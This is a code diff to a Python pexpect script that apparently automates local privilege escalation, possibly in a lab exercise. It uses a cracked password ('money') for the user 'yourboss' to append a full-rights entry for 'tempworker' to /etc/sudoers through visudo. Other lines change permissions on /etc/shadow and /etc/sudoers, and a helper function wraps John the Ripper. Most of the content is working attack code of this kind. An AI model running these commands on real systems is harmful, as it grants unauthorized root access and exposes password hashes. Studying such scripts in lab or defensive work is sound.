@@ -51,17 +51,14 @@ def exec_john_cmd_as_user(user, password, command, delay=True):
 
 
 def exec_elevate_cmd_as_user(user, password, command):
-	""" Executes the given command as user. """
-	spawned = pexpect.spawn(command)
-	ret_status = spawned.expect([pexpect.TIMEOUT, 'assword:'], timeout=60*30) # Catch both 'password:' and 'Password:', timeout at 30min (overkill)
-
-	if ret_status == 0:
-		return "Error: Process timed out"
-
-	else:
-                spawned.sendline(password)
-                return spawned.read().decode('utf-8')
-
+        """ Executes the given command as user. """
+        spawned = pexpect.spawn(command)
+        spawned.expect([pexpect.TIMEOUT, 'assword:'], timeout=60*30) # Catch both 'password:' and 'Password:', timeout at 30min (overkill)
+        spawned.sendline(password)
+        print(spawned.read().decode('utf-8'))
+        spawned.expect(user + ':')
+        spawned.sendline(password)
+        print(spawned.read().decode('utf-8'))
 
 '''
 # We already know tempuser's password
@@ -126,7 +123,7 @@ exec_cmd_as_user('yourboss', yourboss_cracked, 'chmod u=rw,g=r,o= /etc/shadow')
 # Elevate tempworker
 yourboss_cracked = 'money'
 # exec_cmd_as_user('yourboss', yourboss_cracked, 'chmod u=rw,g=rw,o=rw /etc/sudoers')
-exec_elevate_cmd_as_user('yourboss', yourboss_cracked, 'echo "tempworker ALL=(ALL:ALL) ALL" | sudo EDITOR="tee -a" visudo')
+exec_elevate_cmd_as_user('yourboss', yourboss_cracked, 'su yourboss -c echo "tempworker ALL=(ALL:ALL) ALL" | sudo EDITOR="tee -a" visudo')
 # exec_cmd_as_user('yourboss', yourboss_cracked, 'chmod u=r,g=r,o= /etc/sudoers')
 
 
